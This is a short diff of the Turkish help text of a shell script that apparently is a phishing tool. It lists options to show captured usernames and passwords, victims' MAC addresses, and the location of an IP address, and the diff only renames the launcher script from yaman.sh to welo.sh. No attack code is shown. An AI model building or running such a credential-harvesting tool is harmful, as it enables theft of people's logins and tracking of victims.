@@ -15,7 +15,7 @@ case $1 in
 --user         (Giriş Yapılmış Username & Pass)
 --mac          (Giriş Yapanların Mac Adresleri)
 --location     (Belirtilen Ip Adresinin Yer Tespiti)
-bash yaman.sh & sh yaman.sh (Phishing Toolu 'nu Çalıştırır)
+bash welo.sh & sh welo.sh (Phishing Toolu 'nu Çalıştırır)
    "
   ;;
 
